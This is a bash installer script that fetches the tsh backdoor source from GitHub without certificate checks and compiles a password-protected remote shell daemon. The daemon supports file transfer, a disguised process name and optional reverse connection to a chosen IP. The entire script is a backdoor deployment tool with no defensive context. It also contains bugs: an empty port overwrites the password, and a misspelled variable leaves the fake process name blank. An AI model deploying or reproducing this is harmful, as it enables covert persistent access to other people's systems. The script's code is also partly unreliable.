#!/bin/bash
# Author : Longlone
# Description : Download and compile tsh shell (https://github.com/orangetw/tsh)
# Date : 2020.04.28

SCIPRTNAME="${0##*/}"

declare PROCNAME
PROCNAME="/bin/bash"

declare PORT
PORT=6453

declare PASSWORD
PASSWORD="password"

declare HOST
HOST="0.0.0.0"

declare WGET
declare GCC
declare CLIENT
declare INSTALL
INSTALL=0

declare REVERSE
REVERSE="N"

usage() {
    echo
    echo usage:
    echo "$SCIPRTNAME [os]"
    echo
}

if [ $# -lt 1 ];then
    usage
    exit
fi

WGET=$(command -v wget);

if [[ "$WGET" == "" ]]; then
    echo -e "wget is not ready";
    exit
else
    echo -e "wget is ready";
fi

GCC=$(command -v gcc);
if [[ "$GCC" == "" ]]; then
    echo -e "gcc is not ready";
    exit
else
    echo -e "gcc is ready";
fi

# Create config

read -p "Whether to use reverse connection (N/y)" REVERSE

if [[ "$REVERSE" == "y" || "$REVERSE" == "Y" ]];then
    REVERSE="Y"
else
    REVERSE="N"
fi

read -p "PASSWORD (password): " PASSWORD

read -p "SERVER_PORT (6453): " PORT

read -p "FAKE_PROC_NAME (/bin/bash): " PROCNAME

if [[ "$REVERSE" == "Y" ]];then
    read -p "[REVERSE] REVERSE IP (127.0.0.1): " HOST
fi



if [[ "$PORT" == "" ]];then
    PASSWORD=6453
fi

if [[ "$PASSWORD" == "" ]];then
    PASSWORD="password"
fi

if [[ "$HOST" == "" ]];then
    HOST="0.0.0.0"
fi

if [[ "$PROCNAME" == "" ]];then
    PROCNAME="/bin/bash"
fi

read -p "Install now? (Y/n)" INSTALL
if [[ "$INSTALL" == "n" || "$INSTALL" == "N" ]];then
    exit
fi

if [[ "$REVERSE" == "Y" ]];then
    echo "[REVERSE MODE]"
else
    echo "[FORWARD MODE]"
fi

echo
echo -e "PASSWORD $PASSWORD\n"
echo -e "PORT $PORT\n"
echo -e "FAKE_PROC_NAME $PROCNAME\n"

if [[ "$REVERSE" == "Y" ]];then
    echo -e "REVERSE IP $HOST\n"
fi

# Compile #
mkdir tshfold
cd tshfold

ORIGIN="https://raw.githubusercontent.com"

wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/Makefile
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/aes.c
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/aes.h
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/sha1.h
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/sha1.c
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/pel.h
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/pel.c
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/tsh.c
wget -t 0 --no-check-certificate $ORIGIN/orangetw/tsh/master/tshd.c

echo -e "
#ifndef _TSH_H
#define _TSH_H

char *secret = \"$PASSWORD\";

#define SERVER_PORT $PORT
#define FAKE_PROC_NAME \"$PROCENAME\"
" > tsh.h

if [[ "$REVERSE" == "Y" ]];then
    echo -e "
#define CONNECT_BACK_HOST  \"$HOST\"
#define CONNECT_BACK_DELAY 30
" >> tsh.h
fi

echo -e "
#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */" >> tsh.h

make $1

# Clean #
mv tsh ../
mv tshd ../
cd ..
rm -rf tshfold

echo "Deploy tsh success"

if [[ "$REVERSE" == "Y" ]];then
    echo "Please make sure PORT $PORT is open"
fi




